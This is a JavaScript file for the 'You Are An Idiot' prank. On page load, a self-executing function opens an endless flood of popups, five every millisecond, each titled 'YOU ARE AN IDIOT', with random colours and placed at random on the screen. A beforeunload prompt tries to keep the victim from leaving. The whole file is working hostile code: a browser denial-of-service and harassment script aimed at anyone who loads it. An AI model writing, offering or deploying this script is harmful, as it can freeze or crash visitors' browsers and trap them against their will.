function openWindow(url) {
    var newWin = window.open("", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');

    // Move the new window to a random location once
    if (newWin) {
        var screenWidth = screen.width - 357; // Keep within bounds
        var screenHeight = screen.height - 330;

        var randomX = Math.floor(Math.random() * screenWidth);
        var randomY = Math.floor(Math.random() * screenHeight);

        newWin.moveTo(randomX, randomY);

        // Write custom content inside the blank page
        newWin.document.write(`
            <!DOCTYPE html>
                <html>
                    <head>
                        <title>YOU ARE AN IDIOT</title>
                            <style>
                                body {
                                    height: 100vh;
                                    margin: 0;
                                }
                            </style>
                            <script>
                                function getRandomColor() {
                                    const letters = '0123456789ABCDEF';
                                    let color = '#';
                                    for (let i = 0; i < 6; i++) {
                                        color += letters[Math.floor(Math.random() * 16)];
                                    }
                                    return color;
                                }
                        
                                function setRandomBackgroundColor() {
                                    document.body.style.backgroundColor = getRandomColor();
                                }
                        
                                document.addEventListener('DOMContentLoaded', function() {
                                    setRandomBackgroundColor();
                                });
                            </script>
                        </head>
                        <body>
                    </body>
            </html>
        `);
    }

    return newWin;
}

function proCreate() {
    setInterval(() => {
        for (var i = 0; i < 5; i++) {
            openWindow('');
        }
    }, 1); // Adjust delay as needed
}

window.onbeforeunload = function () {
    return "Are you an idiot?";
};

// Self-executing function to start immediately
(function () {
        proCreate();
})();
